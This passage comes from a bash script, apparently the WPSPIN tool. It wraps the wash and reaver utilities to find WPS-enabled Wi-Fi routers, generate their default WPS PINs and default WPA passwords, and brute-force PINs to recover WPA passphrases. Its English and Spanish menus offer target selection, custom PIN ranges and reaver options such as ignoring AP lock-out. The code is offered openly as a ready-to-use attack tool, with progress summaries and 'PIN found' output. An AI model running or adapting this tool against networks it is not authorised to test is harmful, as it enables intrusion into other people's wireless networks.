    echo -e " $NUM   $DISPLAYBSSID   ${RSSI[${i}]}   ${WPS[${i}]}  $DISPLAY_LOCKED    $DISPLAY_PIN   $DISPLY_CHANNEL    $blanco$ESSID$colorbase "
  else
    echo -e " $NUM    $blanco$BSSID$colorbase         $DISPLAY_PIN        $blanco$ESSID$colorbase  " 
  fi
done
echo -e "$colorbase"
echo "--------------------------------------------------------------------------------"
echo ""
CONFORMITY=$(echo ${#BSSID[@]})
if [ "$CONFORMITY" = 0 ]; then

  echo -e  "$rojo ERROR -$blanco no target found we will check if wash can properly reach $amarillo$MON_ATTACK$colorbase "

    if [[ ! `(timeout 4 $WALSH_O_WASH -i $MON_ATTACK -C | grep ERROR )` ]]; 
      then 
echo "--------------------------------------------------------------------------------"
    echo -e "$verdefluo                   wash can properly reach$amarillo $MON_ATTACK$colorbase"
echo "--------------------------------------------------------------------------------"

echo -e "$blanco 
 - Maybe there is$rojo no WPS$blanco devices around?... 
 - Maybe you did not choose the$verdefluo best interface$blanco?
 - Disconnect manually$amarillo every device from the Internet$blanco
 - Check$amarillo permissions$blanco 
 - Check$amarillo mounting point$blanco if you have WPSPIN in an$amarillo USB$blanco or$amarillo external HDD$blanco 
(Especially if you use live mode)
 -$kindofviolet Iw scan mode will proposed soon as an alternative$blanco. 
 -$blanco We$verdefluo try to fix$blanco this and Send you back to the$kindofviolet interface selection $colorbase
$blanco(if you have severals devices, you should be prompt to choose one)$blanco
... If you still see this message;
   ... check your wash-reaver installation
$verdefluo  You can get support and report bugs in$amarillo crack-wifi.com$verdefluo and$amarillo lampiweb.com$verdefluo
and soon in$amarillo Kali linux forum$colorbase"
  sleep 5
  airmon-ng stop $MON_ATTACK &>/dev/null
  unset MON_ATTACK
  IFACE
  BIG_MENUE                      
  else
echo "--------------------------------------------------------------------------------"
    echo -e "                  $rojo wash is not able to reach the interface$colorbase"
echo "--------------------------------------------------------------------------------"
echo -e "$blanco
 - Check your$amarillo reaver/wash$blanco installation
 - Check the$amarillo wireless button$blanco if you use a laptop
 - Check your$amarillo USB ports and connections$blanco if you have a USB device
 -$verdefluo we try to fix$blanco this and send you back to the$kindofviolet interface selection menu 
$blanco (if you have several interfaces you should be prompt to choose between them)$colorbase
"
  sleep 5
  if [[ -n `(airmon-ng stop $MON_ATTACK | grep SIOCSIFFLAGS )` ]]; &>/dev/null
    then
echo "--------------------------------------------------------------------------------"
echo -e " $rojo                      RF-Kill is blocking the device 

$verdefluo     Check if your wireless is activated and check your wireless buttons ! $colorbase"
echo "--------------------------------------------------------------------------------"  
  sleep 5
  unset MON_ATTACK
  IFACE 
  BIG_MENUE
 fi
fi   

     
  else 
TARGETNUMBER=$( echo -e "$colorbase Introduce target number : $amarillo" )  
read  -ep "$TARGETNUMBER " i
echo -e "$colorbase"
   
  
 until [[ $i = *[[:digit:]]* ]] && [[ "$i" -lt "$CONFORMITY" ]]  &&  [[ "$i" -ge 1 ]]   ; do
   echo -e "     $rojo INVALID CHOICE  $colorbase"
      echo ""
      read  -ep "$TARGETNUMBER " i
      echo -e "$colorbase" 
   done
fi
unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8 && unset SPECIAL

BSSID=$(echo ${BSSID[${i}]})
ESSIDSUCIO=$(echo ${ESSID[${i}]})
ESSID="${ESSIDSUCIO%"${ESSIDSUCIO##*[![:space:]]}"}"
CHANNEL=$(echo ${CHANNEL[${i}]})

GENERATE

} 




BIG_MENUE_DISPLAY(){
echo -e "$colorbase copyleft GPL v.3, support the free software!" 
echo -e "
       .$amarillo'(     /$rojo·-.  $amarillo  )(.$rojo--.  $amarillo   /$rojo·-.  .$amarillo'(   )\  )\  $rojo
   ,') \  )  ,' _  \  (   ._.'  ,' _  \ \  ) (  \, / $colorbase     coded by$blanco kcdtv $rojo   
  (  /(/ /  (  '-' (   ·-. .   (  '-' ( ) (   ) \ (   $colorbase featuring  $blanco antares_145$rojo
   )    (    ) ,._.'  ,_ (  \   ) ,._.' \  ) ( ( \ \    $blanco r00tnull$colorbase -$blanco 1camaron1$rojo
  (  .'\ \  (  '     (  '.)  ) (  '      ) \  ·.)/  )    $blanco Coeman76$colorbase -$blanco Spawn$rojo  
$amarillo   )/   )/   )/   $rojo    '._,_.' $amarillo  )/        )/  $rojo   '$amarillo.( $colorbase  and the$blanco lampiweb team $colorbase"
echo ""
echo ""
echo -e "    $amarillo www.crack-wifi.com     www.lampiweb.com    www.auditoriaswireless.net$colorbase"

echo ""
echo ""
echo -e "                                                        "
echo -e " $magenta      _   ''   $rojo  _ () _      $amarillo                _ _ _                       
 $magenta     [|)efault$rojo  ||)[][|\|$magenta  generator  with$amarillo   \\/\/||)S $magenta attack  interface
   $rojo              L|          $amarillo                     L|  $magenta  ''                   "
echo ""

echo -e "$rojo
                         _ _  () _     _ _     
                        //\/\A[][|\|  //\/\ E[|\|ue '' $colorbase" 
echo "

"
echo -e "                +----------------------------------------------+  "
echo -e "                |                                              |  "
echo -e "                |  $amarillo   1$colorbase  -$blanco  AUTOMATED MODE (WASH AND REAVER)$colorbase   |  "
echo -e "                |  $amarillo   2$colorbase  -$blanco  PIN GENERATOR (WITH ATTACK MENU)$colorbase   |  "
echo -e "                |  $amarillo   3$colorbase  -$blanco  CHANGE INTERFACE$colorbase                   |  "
echo -e "                |  $amarillo   4$colorbase  -$blanco  RESTART OR CHANGE LANGUAGE$colorbase         |  "
echo -e "                |  $amarillo   5$colorbase  -$blanco  EXIT$colorbase                               |  "
echo -e "                |                                              |  "
echo -e "                +----------------------------------------------+  "
echo "
"
echo -e "                                  Your Choice    "
echo -e "$rojo"
read -ep "                                       " BIG_MENUE_CHOICE
echo -e "$colorbase"
until [[ $BIG_MENUE_CHOICE = *[[:digit:]]* ]]  &&  [[ "$BIG_MENUE_CHOICE" -gt "0" ]]  && [[ "$BIG_MENUE_CHOICE" -lt "6" ]] ; do
  BIG_MENUE_DISPLAY
done

}



CIAO(){

echo ""
echo -e " $colorbase                      Cheers!
                              See you in$amarillo crack-wifi.com $colorbase
                        $rojo  | $amarillo lampiweb.com$colorbase and$amarillo auditoriaswireless.net$colorbase  "
echo -e "                $rojo          |.===.       "
echo -e "                     $colorbase  - $rojo {}$violet° 0$rojo{} $colorbase -         "           
echo -e "----------------------$blanco ooO$colorbase--$blanco(_)$colorbase-$blanco Ooo$colorbase--------------------------------------------"
exit 0
}



ATTACK_MENUE_DISPLAY(){
echo -e "    $colorbase              "
echo -e "              Target > $blanco$ESSID $colorbase mac > $blanco$BSSID $colorbase"
echo -e "              +----------------------------------------------------+  "
echo -e "              |$blanco   1 $colorbase -$amarillo ATTACK WITH REAVER AND PIN $rojo$PIN$colorbase         |  "
echo -e "              |$blanco   2 $colorbase -$amarillo MANUALLY ENTER A PIN FOR ATTACK$colorbase             |  "
echo -e "              |$blanco   3 $colorbase -$amarillo SELECT A RANGE OF PIN TO TRY FIRST$colorbase          |  "
echo -e "              |$blanco   4 $colorbase -$amarillo CUSTOMIZE REAVER ATTACK$colorbase                     |  "
echo -e "              |$blanco   5 $colorbase -$verdefluo SELECT ANOTHER TARGET$colorbase                       |  "
echo -e "              |$blanco   6 $colorbase <$azulfluo GO BACK$blanco /$amarillo RESCAN$colorbase +$amarillo CHANGE INTERFACE   $colorbase      |  "
echo -e "              |$blanco   7 $colorbase -$azulfluo RESTART$blanco /$amarillo CHANGE LANGUAGE$colorbase                   |  "
echo -e "              |$blanco   8 $colorbase -$rojo EXIT $colorbase                                       |  " 
echo -e "              +----------------------------------------------------+  "
echo ""
echo -e "                                 your choice$rojo  "
echo ""
read -ep "                                      " ATTACK_MENUE_CHOICE
echo -e " $colorbase"
until [[ $ATTACK_MENUE_CHOICE = *[[:digit:]]* ]] && [[ "$ATTACK_MENUE_CHOICE" -lt "9" ]]  &&  [[ "$ATTACK_MENUE_CHOICE" -gt "0" ]]; do
  ATTACK_MENUE_DISPLAY
done

}


CUSTOMPIN()                     # This function is used to allow the user to manually enter a PIN to be tried first 
{                               # option 2 in the attack menu

unset SELECTEDPIN 2> /dev/null  # we delete the former selected PIN if it remained set

echo ""
echo -e "        $colorbase     Enter the$amarillo 7 first digit$colorbase of the$amarillo PIN$colorbase you want to try first 
                              (no checksum required)
$rojo"
read -ep "                                   " SELECTEDPIN 
while !(echo $SELECTEDPIN | egrep -q "^([0-9]{7})$")
  do
    echo ""
    echo -e "                       $rojo ERROR: YOU DID NOT ENTER 7 NUMBERS $amarillo"
    CUSTOMPIN
done
echo -e "$colorbase"
}


SECATOR()                   # This function let the user choose for a sequence of PIN to try first, we determine 4 values, 2 4 digits strings
{                           # ( first half PIN ) and 2 3 digits strings ( second half )

unset INICIOSEQUENCEFIRST 2> /dev/null  #  We ensure that there is not former values stored
unset FINSEQUENCEFIRST 2> /dev/null     #

  if [[ "$HEAD3" = "0" ]]; then         # if the first half PIN hasn't been found yet we propose to customize sequence on the first PIN
    echo "+------------------------------------------------------------------------------+"
    echo -e "|        $azullight         1* DEFINING THE SEQUENCE FOR THE$verdefluo FIRST HALF PIN $colorbase             |"
    echo "+------------------------------------------------------------------------------+" 
    ASKSSTARTSEQUENCE=$( echo -e "$colorbase Enter the 4 numbers at the$blanco beginning of the sequence$verdefluo ")
    
    read -ep "$ASKSSTARTSEQUENCE" INICIOSEQUENCEFIRST
while !(echo $INICIOSEQUENCEFIRST | egrep -q "^([0-9]{4})$")
           do
            echo ""
            echo -e "                       $rojo ERROR: YOU HAVE TO ENTER 4 NUMBERS $colorbase "
            echo "" 
             read -ep "$ASKSSTARTSEQUENCE" INICIOSEQUENCEFIRST
done
    
    ASKENDSEQUENCE=$( echo -e "$colorbase Enter the 4 numbers at the$blanco end of the sequence$rojo ")
    
    read -ep "$ASKENDSEQUENCE" FINSEQUENCEFIRST                                                                      
   
    
          while !(echo $FINSEQUENCEFIRST | egrep -q "^([0-9]{4})$")
           do
            echo ""
            echo -e "                       $rojo ERROR: YOU HAVE TO ENTER 4 NUMBERS $colorbase "
            echo ""   
                read -e -p "$ASKENDSEQUENCE" FINSEQUENCEFIRST                                                               
         done 

  fi

unset INICIOSEQUENCESECOND 2> /dev/null  #  We ensure that there is not former values stored
unset FINSEQUENCESECOND 2> /dev/null

    echo -e "$colorbase+------------------------------------------------------------------------------+"
    echo -e "|       $azullight          2* DEFINING THE SEQUENCE FOR THE$rojo SECOND HALF PIN  $colorbase           |"
    echo -e "+------------------------------------------------------------------------------+"
    echo -e "|                  $blanco  ($amarillo no checksum required$blanco -$amarillo Enter X to exit$blanco )$colorbase                |"
    ASKSSTARTSEQUENCE2=$( echo -e "$colorbase Enter the 3 numbers at the$blanco beginning of the sequence$verdefluo ")
    read -ep "$ASKSSTARTSEQUENCE2" INICIOSEQUENCESECOND     

    

      while !(echo $INICIOSEQUENCESECOND | egrep -q "^([0-9]{3})$") 
        do 
            if [[ "$INICIOSEQUENCESECOND" == "X" || "$INICIOSEQUENCESECOND" == "x" ]] ; then
   
              break
            fi
          echo ""
          echo -e "                  $rojo ERROR: YOU HAVE TO ENTER 3 NUMBERS or X to EXIT $colorbase "
          echo ""
          read -ep "$ASKSSTARTSEQUENCE2" INICIOSEQUENCESECOND
      done


    ASKENDSEQUENCE2=$( echo -e "$colorbase Enter the 3 numbers at the$blanco end of the sequence$rojo ")

    read -ep "$ASKENDSEQUENCE2" FINSEQUENCESECOND

    while !(echo $FINSEQUENCESECOND | egrep -q "^([0-9]{3})$")  
      do 
         if [[ "$FINSEQUENCESECOND" == "X" || "$FINSEQUENCESECOND" == "x" ]]; then
           break
         fi
          echo ""
          echo -e "                  $rojo ERROR: YOU HAVE TO ENTER 3 NUMBERS or X to EXIT $colorbase "
          echo ""
          read -ep "$ASKENDSEQUENCE2" FINSEQUENCESECOND
  
    done
echo -e "$colorbase+------------------------------------------------------------------------------+"
}
 



SUMUPNOM6()
{
PINECRAN=$( printf '%04d\n' $HEAD1 )
PINLEFT=`expr 11000 '-' $HEAD1`
PINLEFTECRAN=$( printf '%05d\n' $PINLEFT ) 
PORCENT1=`expr $HEAD1 '*' 100 '/' 11`

PORCENT2=$( printf '%05d\n' $PORCENT1 )

INICIOPORCENT=$( echo "$PORCENT2" | cut -b -2 )

ENDPORCENT=$( echo "$PORCENT2" | cut -b 3- )

 
echo " +--------------------------------------+"
echo -e " |   $amarillo             SUM-UP        $colorbase        | "   
echo " +--------------------------------------+"
echo -e " |      Attacking the$rojo first$colorbase half        | "
echo -e " |    First half PIN tried - $amarillo $PINECRAN$colorbase      |"    
echo -e " |      Maximum$amarillo $PINLEFTECRAN$colorbase PIN left          |"
echo " +--------------------------------------+"
echo -e " | $rojo$INICIOPORCENT$colorbase,$rojo$ENDPORCENT$colorbase% of the attack has been made  |"
echo " +--------------------------------------+"  


}



SUMUPM6()
{
 
PINECRAN=$( printf '%04d\n' $HEAD1 )
PINECRAN2=$( printf '%03d\n' $HEAD2 )
PINLEFT=`expr 1000 '-' $HEAD2`
PINLEFTECRAN=$( printf '%03d\n' $PINLEFT ) 
PORCENT1=`expr '(' $HEAD2 '+' 10000 ')' '*' 100 '/' 11`

PORCENT2=$( printf '%04d\n' $PORCENT1 )
INICIOPORCENT=$( echo "$PORCENT2" | cut -b -2 )
ENDPORCENT=$( echo "$PORCENT2" | cut -b 2- ) 
echo -e " $colorbase "  
echo "+------------------------------------------------------------------------------+"
echo -e "|   $amarillo                                 SUM-UP                            $colorbase        |"    
echo "+------------------------------------------------------------------------------+"
echo -e "|   $verdefluo   THE FIRST HALF IS FOUND !  $colorbase      |      Attacking the$rojo second$colorbase half       |" 
echo -e "|               $amarillo $PRIMERAMITAD$colorbase                   |     Second half PIN tried - $amarillo $PINECRAN2$colorbase     |"
echo -e "|    First half PIN tried - $verdefluo $PINECRAN$colorbase       |       Maximum$amarillo $PINLEFTECRAN$colorbase PIN left           |"    

echo "+------------------------------------------------------------------------------+"
echo -e "|                     $rojo$INICIOPORCENT$colorbase,$rojo$ENDPORCENT$colorbase% of the attack has been made                     |"
echo "+------------------------------------------------------------------------------+"  
echo -e "$colorbase"

}



PINFOUND(){

DATE=$(  date | cut -d "," -f 1 ) 
NEWNAME=${DATE// /_}
DISPLAYNEWNAME1=$( echo "$NEWNAME-$WPCNAME                                                            " | cut -b -70 )
DISPLAYNAME=$( echo "$DISPLAYNEWNAME1 $colorbase|") 
echo -e " $colorbase "  
echo "+------------------------------------------------------------------------------+"
echo -e "|       $verdefluo  THE PIN HAS BEEN FOUND !            $colorbase pin is $amarillo$PIN    $colorbase             |"
echo "+------------------------------------------------------------------------------+"
echo "|              *.wpc session backed up in your WPSPIN folder as                |"
echo -e "|       $azulfluo$DISPLAYNAME"
echo "+------------------------------------------------------------------------------+"

cat "$DIRECTORY/$WPCNAME" >> "$NEWNAME$WPCNAME"

rm -r "$DIRECTORY/$WPCNAME"

}



FAILEDREAVER()
{
echo "+------------------------------------------------------------------------------+"
echo -e "$rojo                                  ERROR $colorbase
+------------------------------------------------------------------------------+
$blanco                Reaver was unable to initialise interface$amarillo $MON_ATTACK$blanco
  
  - Check your$amarillo wireless button$blanco
  - Check your$amarillo USB ports/connection$blanco
  -$amarillo Disconnect$blanco all devices 

... We try to$verdefluo fix this$blanco and Send you back in the$kindofviolet interface menu
$colorbase"
sleep 5 
  
  if [[ -n `(airmon-ng stop $MON_ATTACK | grep SIOCSIFFLAGS )` ]]; &>/dev/null
    then
echo "--------------------------------------------------------------------------------"
echo -e " $rojo                      RF-Kill is blocking the device 

$verdefluo     Check if your wireless is activated and check your wireless buttons ! $colorbase"
echo "--------------------------------------------------------------------------------"  
sleep 5
fi

rm attack.txt
unset MON_ATTACK
IFACE
BIG_MENUE
}




FAKEM4WARNING()
{
echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "| $rojo                        SUSPICIOUS M4 DETECTED$colorbase                               |"
echo "+------------------------------------------------------------------------------+"
echo -e "|$blanco Sometimes reaver processes M4 that hasn't been fully checked and the key is$colorbase  |"
echo -e "|$blanco   not recovered. If this happens to you$rojo delete the file $amarillo$WPCNAME$colorbase     |"
echo -e "|$blanco      rename the file$amarillo BACKUPfakeM4_$WPCNAME$blanco as$verdefluo $WPCNAME$colorbase       |"
echo -e "|$blanco                  You will get back to the first$rojo suspicious M4$colorbase                |"
echo "+------------------------------------------------------------------------------+"
echo -e "$colorbase"
}


FAKEM6WARNING()
{
echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "| $rojo                        SUSPICIOUS M6 DETECTED$colorbase                               |"
echo "+------------------------------------------------------------------------------+"
echo -e "|$blanco Sometimes reaver processes M6 that hasn't been fully checked and the key is$colorbase  |"
echo -e "|$blanco    not recovered. If this happens to you$rojo delete the file $amarillo$WPCNAME$colorbase    |"
echo -e "|$blanco      rename the file$amarillo BACKUPfakeM6_$WPCNAME$blanco as$verdefluo $WPCNAME$colorbase       |"
echo -e "|$blanco                  You will get back to the first$rojo suspicious M6$colorbase                |"
echo "+------------------------------------------------------------------------------+"
echo -e "$colorbase"
}



CUSTOMREAVER()
{
echo -e "$colorbase+------------------------------------------------------------------------------+
|                  $violet          AVALAIBLE OPTIONS           $colorbase                      |
+------------------------------------------------------------------------------+
|$amarillo -e$colorbase --essid=<ssid>    $blanco          ESSID of the target AP    $colorbase                    |
|$amarillo -c$colorbase --channel=<channel>    $blanco     Set the 802.11 channel for the interface  $colorbase    |
|                                $blanco            (implies -f)         $colorbase             |
|$amarillo -D$colorbase --daemonize   $blanco              Daemonize reaver         $colorbase                     |
|$amarillo -a$colorbase --auto       $blanco               Auto detect the best advanced options for   $colorbase  |
|                                     $blanco          the AP       $colorbase                  |
|$amarillo -f$colorbase --fixed       $blanco              Disable channel hopping           $colorbase            |
|$amarillo -5$colorbase --5ghz          $blanco            Use 5GHz 802.11 channels       $colorbase               |
|$amarillo -d$colorbase --delay=<seconds>  $blanco         Set the delay between pin attempts [1] $colorbase       |
|$amarillo -l$colorbase --lock-delay=<seconds> $blanco     Set the time to wait if the AP locks WPS pin $colorbase |
|                                        $blanco    attempts [60]               $colorbase      |
|$amarillo -g$colorbase --max-attempts=<num>    $blanco    Quit after certain number of pin attempts$colorbase     |
|$amarillo -x$colorbase --fail-wait=<seconds>   $blanco    Set the time to sleep after 10 unexpected   $colorbase  |
|                                   $blanco          failures [0]              $colorbase       |
|$amarillo -r$colorbase --recurring-delay=<x:y>   $blanco  Sleep for y seconds every x pin attempts  $colorbase    |
|$amarillo -t$colorbase --timeout=<seconds>       $blanco  Set the receive timeout period [5]        $colorbase    |
|$amarillo -T$colorbase --m57-timeout=<seconds>  $blanco   Set the M5/M7 timeout period [0.20]   $colorbase        |
|$amarillo -A$colorbase --no-associate       $blanco       Do not associate with the AP       $colorbase           |
|                         $blanco    (association must be done by another application)$colorbase|
|$amarillo -N$colorbase --no-nacks       $blanco          Do not send NACK messages when out of order  $colorbase  |
|                                   $blanco      packets are received   $colorbase              |
|$amarillo -S$colorbase --dh-small      $blanco            Use small DH keys to improve crack speed $colorbase     |
|$amarillo -L$colorbase --ignore-locks      $blanco        Ignore locked state reported by the target AP$colorbase |
|$amarillo -E$colorbase --eap-terminate     $blanco        Terminate each WPS session with an    $colorbase        |
|                                   $blanco        EAP FAIL packet           $colorbase         |
|$amarillo -n$colorbase --nack           $blanco           Target AP always sends a NACK [Auto]  $colorbase        |
|$amarillo -w$colorbase --win7          $blanco            Mimic a Windows 7 registrar [False]      $colorbase     |
+------------------------------------------------------------------------------+
Red arguments are mandatory ($rojo reaver -i $MON_ATTACK -b $BSSID$colorbase )
Complete the line  below$colorbase. Add$amarillo -c $CHANNEL$colorbase to fix your target channel.
Add $amarillo-vv $colorbase to get detailed information during the attack ( full verbose )
good luck :) $amarillo 
" 
MANDATORY=$( echo -e "$rojo reaver -i $MON_ATTACK -b $BSSID$verdefluo") 
read -e -p " $MANDATORY " REAVERCOMMAND
echo -e "$colorbase"
 
until [ -z `echo $REAVERCOMMAND | tr vecDaf1234567890dlgxrtTANSLEnw - | tr -d "-" | tr -d ' '` ] ;
do
 echo -e "$rojo error,$blanco invalid argument, check the list above"
 echo "complete the line with valid syntaxs or just press enter
"
 read -e -p " $MANDATORY " REAVERCOMMAND
 echo -e "$colorbase"
done
echo -e "$blanco Your customized line is memorised and will be used in the next attack$colorbase
You can now launch the attack ($blanco 1 $colorbase) with the PIN indicated in the menu. 
You may insert another PIN ($blanco 2$colorbase ) or define a sequence of PIN ($blanco 3 $colorbase)

"

}


MON_ADVERTENCIA=$( echo -e "                                        
                 $rojo              WARNING 
$colorbase
$rojo   Only one chipset is available and airmon-ng doesn't fully recognize it
                scanning and WPS attack may not work properly :(  
$colorbase
" )                                                                # warning the user if his chipset is not fully recognized by airmon-ng





INTERFACEDESIGN=$( echo -e "$colorbase
   NUMBER     INTERFACE        CHIPSET & DRIVER
              ---------------------------------------------------   
$blanco")                                                               # up part of the interface selection menu   





WASHWAIT=$(echo "+------------------------------------------------------------------------------+" 
        echo -e "|                $verdefluo       THE SCAN WITH WASH IS LAUNCHED$colorbase                         |
+------------------------------------------------------------------------------+
|$blanco Default PIN will be displayed: $colorbase                                              |
|                                                                              |
|$blanco  - in$verdefluo green$blanco if the device is supported  $colorbase                                     |
|$blanco  - in$orange orange$blanco if the device is unknown $colorbase                                       |
|$blanco  - in$rojo red$blanco with no numeric value if the device is unsupported $colorbase                |
|                                                                              |
|$azulfluo If BSSID is blue$blanco the default WPA will be generated if the target is selected$colorbase |
|                                                                              |
+------------------------------------------------------------------------------+
|         $magenta         CLOSE THE SCAN WINDOW TO GET TO THE NEXT STEP $colorbase              |
+------------------------------------------------------------------------------+")
 





NO_MONITOR_MODE=$(echo -e "$rojo          WARNING$colorbase :$amarillo  NO COMPATIBLE WIRELESS INTERFACE IS AVAILABLE  $colorbase 

$rojo     WPSPIN will be executed in a reduced mode without scanning or attack$colorbase
$rojo             You can reload interface checking with option 2$colorbase")




NO_REAVER=$(echo -e "$rojo          WARNING$colorbase :$amarillo    REAVER WPS IS NOT PRESENT IN THE SYSTEM  $colorbase 

$rojo     WPSPIN will be executed in a reduced mode without scanning or attack$colorbase
$rojo    Install reaver 1.3 or reaver 1.4 (by svn) to enjoy all WPSPIN features$colorbase")



FAILED=$(echo -e " 
                       +-----------------------------------+
                       |     $blanco   The attack has failed $colorbase     |
                       +-----------------------------------+ 
                       |  $rojo     WPA PASSPHRASE NOT FOUND!$colorbase   |  
                       +-----------------------------------+
" )

KEY_FOUND=$(echo -e " 
                      +------------------------------------+
                      |$verdefluo     WPA PASSPHRASE RECOVERED!     $colorbase |
                      +------------------------------------+
                      Results saved in your WPSPIN folder in $colorbase "
 )




STOP_REAVER=$(echo -e " $rojo                      < CTRL + C > TO STOP THE ATTACK $colorbase "
 )


AIRMON_WARNING=$(echo -e "                                                       
$tojo                        WARNING!$amarillo UNKNOWN CHIPSET SELECTED

$rojo                    Scan and attack may not work properly
$rojo                 You should use option 3 and change interface$colorbase "
 )                                                                             # warning display for unknown chipset




ROOT_ADVERTENCIA=$( echo -e "                                        
                 $tojo         WARNING -$amarillo NO ROOT PRIVILEGES 
$colorbase
$rojo        You are not logged as root and cannot use fully WPSPIN,
  launch the script with sudo or start again in a shell with root privileges$colorbase" 
)                                                                                              # warning display for non root user




DIRECTORY_ADVERTENCIA=$( echo -e "                                        
                 $tojo           WARNING -$amarillo BAD LOCATION 
$colorbase
$rojo You have to be situated in the WPSPIN directory to execute the script correctly
       Leave the script in it original folder, do not rename the folder 
                  use the cd command for a correct location$colorbase" 
)  




##########################################################################################
elif [ "$SELECTIONLANGUE" == 2 ]; then ################################### 2 > ESPAÑOL  ########################################################################

OUTPUT(){

echo -e "$colorbase"
echo "+------------------------------------------------------------------------------+"
echo -e "| $violet                     INFORMACIÓN  SOBRE DISPOSITIVO   $colorbase                       |"
echo "+------------------------------------------------------------------------------+"

if [ -n "${FABRICANTE}" ]; then
     DISPLAYFABRICANTE=$( echo "$FABRICANTE                                                              " | cut -b -61 )
echo -e "| Fabricante   :$amarillo $DISPLAYFABRICANTE $colorbase|"
fi

if [ -n "${DEFAULTSSID}" ]; then
    DISPLAYDEFAULTSSID=$( echo "$DEFAULTSSID                                                              " | cut -b -61 )                                                             
     echo -e "| SSID defecto :$amarillo $DISPLAYDEFAULTSSID $colorbase|"
fi

if [ -n "${MODEL}" ]; then
DISPLAYMODEL=$( echo "$MODEL                                                              " | cut -b -61 )
     echo -e "| Modelo       :$amarillo $DISPLAYMODEL $colorbase|"
fi

     unset DISPLAYFABRICANTE && unset DISPLAYDEFAULTSSID && unset DISPLAYMODEL

if [ "$UNKNOWN" -eq "0"  ]; 
    then

     echo "+------------------------------------------------------------------------------+"
     echo -e "|                   $violet        INFORMACION SOBRE WPS    $colorbase                          |"
     echo "+------------------------------------------------------------------------------+"

       if [ "$ACTIVATED" -eq "1" ] ; 
        then
          echo -e "| $verdefluo                         WPS ACTIVADO POR DEFECTO    $colorbase                        |" 
          echo "+------------------------------------------------------------------------------+"
       else
          echo -e "|        $rojo                WPS NO ACTIVADO POR DEFECTO      $colorbase                     |"
          echo "+------------------------------------------------------------------------------+"  
       fi

      if  [ "$APRATE" -eq "0" ] ;
        then
        echo -e "|        $verdefluo                NO SISTEMA DE BLOQUEO DEL WPS      $colorbase                   |"  
        echo "+------------------------------------------------------------------------------+"
      else
        echo -e "|   $rojo       CUIDADO : EXISTE UN SISTEMA DE DEFENSA DE BLOQUEO DEL WPS   $colorbase        |"
        echo "+------------------------------------------------------------------------------+"
      fi
 
      if  [ "$SPECIAL" -eq "1" ] ;
        then
        echo -e "| $rojo  COMPRUEBE EL MODELO EXACTO, VARIOS MODELOS COMPARTEN ESTE RANGO DE BSSID $colorbase  |"
        echo "+------------------------------------------------------------------------------+" 
      fi
  DISPLAYPIN=$( echo "$PIN $PIN1 $PIN2 $PIN3 $PIN4 $PIN5 $PIN6 $PIN7 $PIN8                                                                   " | cut -b -78 )        

echo "+------------------------------------------------------------------------------+"
echo -e "|       $violet                     PIN(s) por DEFECTO     $colorbase                           |"     
echo -e "|$amarillo$DISPLAYPIN$colorbase|"
echo "+------------------------------------------------------------------------------+"
 
  elif [ "$UNKNOWN" -eq "1"  ]; then


    echo "+------------------------------------------------------------------------------+"
    echo -e "|          $orange                  MODELO DESCONOCIDO           $colorbase                     |"
    echo "|                                                                              |"
    echo "+------------------------------------------------------------------------------+" 
    echo -e "|                        $orange PIN POSSIBLE :$amarillo $PIN        $colorbase                      |" 
    echo "+------------------------------------------------------------------------------+"
 
else
    echo "+------------------------------------------------------------------------------+" 
    echo -e "|          $rojo                   MODELO NO SOPORTADO  $colorbase                            |"
    echo "|                                                                              |"
    echo "+------------------------------------------------------------------------------+"


fi

if [ -n "${DEFAULTWPA}" ]; then
DEFAULTWPADISPLAY=$(echo "$DEFAULTWPA                                                                           " | cut -c -78)
 echo -e "|  $violet                      CONTRASEÑA WPA POR DEFECTO $colorbase                           |"
 echo -e "|$verdefluo$DEFAULTWPADISPLAY$colorbase|"
 echo "+------------------------------------------------------------------------------+"
fi


}



DATASGENERADOR(){
echo ""
echo -e "                    -------------------------------------"
echo ""
read -ep "                1 > Insertar el Essid y darle a <Enter> : "  ESSID          # essid como variable - gracias r00tnuLL por el "ep" ;)                
echo "  "
read -ep "                2 > Insertar el Bssid y darle a <Enter> : " BSSID           # bssid como variable
echo "  "
  while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
   do                                                              # filtro bssid haciendo un bucle while sobre condición... gracias antares XD
   echo -e " $rojo Error de sintaxis : MAC Non Conforme $colorbase"
   echo "  "
   read -ep "                2 > Insertar el Bssid y darle a <Enter> : " BSSID
   echo "  "            
  done
}





SHORTMENUE(){                                                 # Menú en el cual esta limitado el usuario sin mode monitor, solo generador



                       # 3 es para salir de WPSPIN, hasta que el usuario no entre tres nos quedemos en el menú


echo "$SORTMENUE_WARNING"
echo ""
echo ""
echo -e "                              $orange       ¿   $negro  ?           "
echo -e "                            $verde    ?   $azul    ?      $colorbase        " 
echo -e "                        $blanco       ¿ $colorbase  >X<  $gris  ¿         $colorbase "     
echo -e "                               -  (O o)  -         "
echo -e "                    +---------ooO--(_)--Ooo-------------+   "
echo -e "                    |                                   |   " 
echo -e "                    | $blanco   1$colorbase -$amarillo  GENERAR PIN$colorbase               |   "
echo -e "                    | $blanco   2$colorbase -$amarillo  REDETECTAR INTERFACES$colorbase     |   "
echo -e "                    | $blanco   3$colorbase -$amarillo  SALIR$colorbase                     |   "
echo -e "                    |                                   |   "
echo -e "                    +-----------------------------------+   "
echo ""
echo ""
echo ""
echo -e "                              su elección : $rojo"                     
echo ""  
read -ep  "                                      " SHORTMENUE_CHOICE                
echo -e "$colorbase"


if [ "$SHORTMENUE_CHOICE" == "1" ] ; then

    DATASGENERADOR
    GENERATE
    OUTPUT
unset PIN2 && unset PIN3 && unset PIN4 && unset PIN5 && unset PIN6 && unset PIN7 && unset PIN8 && unset  FABRICANTE  && unset DEFAULTSSID   && unset MODEL

echo -e " "
echo -e "      ...$verdefluo pulsa <enter> para seguir adelante$colorbase ..."    # pausamos el proceso ara que el usuario pueda apuntar o copiar los datos 
read -ep "" NIENTE

   SHORTMENUE  
  
elif [ "$SHORTMENUE_CHOICE" == "2" ] ; then

    IFACE

elif [ "$SHORTMENUE_CHOICE" == "3" ]; then

CLEAN
CIAO

exit

else

echo -e " ................  $magenta opción inválida$colorbase ........"

 SHORTMENUE
    

fi

}


SELECT_THEIFACE (){
read -ep "                           elegir la interfaz : " i        # ask the user to choose among avalaible interfaces   
}



WASH_DISPLAY(){    


